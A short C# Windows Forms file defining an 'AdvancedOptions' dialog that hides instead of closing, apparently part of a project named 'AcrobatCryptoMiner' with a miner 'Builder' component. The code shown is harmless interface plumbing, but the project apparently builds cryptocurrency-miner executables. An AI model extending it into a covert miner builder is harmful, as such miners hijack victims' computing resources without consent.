using System;
using System.Windows.Forms;

namespace AcrobatCryptoMiner
{
    public partial class AdvancedOptions
    {
        public AdvancedOptions()
        {
            InitializeComponent();
        }

        public Builder F;

        private void advancedOptions_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            Hide();
        }
    }
}